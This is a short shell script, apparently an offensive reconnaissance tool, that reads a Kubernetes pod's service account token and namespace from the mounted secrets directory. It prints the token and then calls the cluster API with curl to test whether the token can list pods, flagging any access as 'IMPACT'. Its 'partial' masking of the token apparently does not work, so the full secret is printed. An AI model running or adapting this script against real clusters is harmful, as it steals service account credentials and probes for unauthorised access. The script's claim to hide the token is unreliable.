#!/bin/sh
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)

echo "--- [ ELITE TOKEN DISCOVERY ] ---"
echo "Target Namespace: $NAMESPACE"
echo "Secret Token (Partial): ${TOKEN%..........}**********"
echo ""
echo "--- [ TESTING PERMISSIONS ] ---"
# Use the token to ask the API what we can do
curl -ks -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces/$NAMESPACE/pods | grep -q "kind" && echo "[!] IMPACT: Token has READ access to other pods!" || echo "[?] Token is restricted (Safe)"
